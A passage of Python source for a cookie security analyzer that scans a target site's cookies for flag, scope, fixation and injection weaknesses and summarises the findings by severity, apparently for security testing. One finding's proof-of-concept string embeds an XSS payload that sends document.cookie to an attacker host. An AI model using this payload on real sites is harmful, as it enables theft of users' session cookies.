                    endpoint=cookie.endpoint,
                    evidence={
                        'cookie_name': name,
                        'path': '/',
                        'context': 'Admin cookie with broad path'
                    },
                    poc=f"""# XSS on public page steals admin cookie
<script>
// On /blog/post page, can read admin cookies:
fetch('https://attacker.com/steal?admin_c=' + document.cookie);
</script>""",
                    impact="XSS on low-privilege pages can steal high-privilege cookies",
                    remediation=f"Set restrictive path: Set-Cookie: {name}=...; Path=/admin",
                    cwe_id="CWE-668"
                ))

        return findings

    def run_all_tests(self, endpoints: Optional[List[str]] = None) -> List[CookieFinding]:
        """
        Run all cookie security tests.

        Args:
            endpoints: List of endpoints to collect cookies from

        Returns:
            List of all findings
        """
        # Check database before testing
        context = DatabaseHooks.before_test(self.domain, 'cookie_security_analyzer')

        if context['should_skip']:
            print(f"[!] {context['reason']}")
            print(f"[*] Previous findings: {len(context['previous_findings'])}")
            return []

        print(f"[*] Starting cookie security analysis for {self.target_url}")
        print(f"[*] {context['reason']}")

        # Collect cookies
        self.collect_cookies(endpoints)

        if not self.collected_cookies:
            print("[!] No cookies found to analyze")
            return []

        print(f"[*] Analyzing {len(self.collected_cookies)} cookie(s)")

        # Run all tests
        all_findings = []

        test_methods = [
            self.test_security_flags,
            self.test_cookie_injection,
            self.test_session_fixation,
            self.test_session_prediction,
            self.test_cookie_overflow,
            self.test_cookie_scope
        ]

        for test_method in test_methods:
            findings = test_method()
            all_findings.extend(findings)
            self.findings.extend(findings)

        # Record results in database
        if all_findings:
            print(f"\n[+] Found {len(all_findings)} cookie security issues")

            # Group by severity
            by_severity = {}
            for finding in all_findings:
                sev = finding.severity.value
                by_severity[sev] = by_severity.get(sev, 0) + 1

            for severity in ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW', 'INFO']:
                if severity in by_severity:
                    print(f"    {severity}: {by_severity[severity]}")

        return all_findings

    def get_findings_by_severity(self, severity: CookieSeverity) -> List[CookieFinding]:
        """Get findings filtered by severity."""
        return [f for f in self.findings if f.severity == severity]

    def get_summary(self) -> Dict[str, Any]:
        """Generate summary of findings."""
        severity_counts = {
            'CRITICAL': len(self.get_findings_by_severity(CookieSeverity.CRITICAL)),
            'HIGH': len(self.get_findings_by_severity(CookieSeverity.HIGH)),
            'MEDIUM': len(self.get_findings_by_severity(CookieSeverity.MEDIUM)),
            'LOW': len(self.get_findings_by_severity(CookieSeverity.LOW)),
            'INFO': len(self.get_findings_by_severity(CookieSeverity.INFO))
        }

        return {
            'target': self.target_url,
            'total_cookies': len(self.collected_cookies),
            'total_findings': len(self.findings),
            'severity_breakdown': severity_counts,
            'vulnerable': len(self.findings) > 0,
            'findings': [f.to_dict() for f in self.findings]
        }


def main():
    """Example usage."""
    import sys

    if len(sys.argv) < 2:
        print("Usage: python cookie_security_analyzer.py <target_url> [endpoints...]")
        sys.exit(1)

    target = sys.argv[1]
    endpoints = sys.argv[2:] if len(sys.argv) > 2 else ['/']

    analyzer = CookieSecurityAnalyzer(target_url=target)
    findings = analyzer.run_all_tests(endpoints=endpoints)

    print("\n" + "="*80)
    print(json.dumps(analyzer.get_summary(), indent=2))


if __name__ == "__main__":
    main()
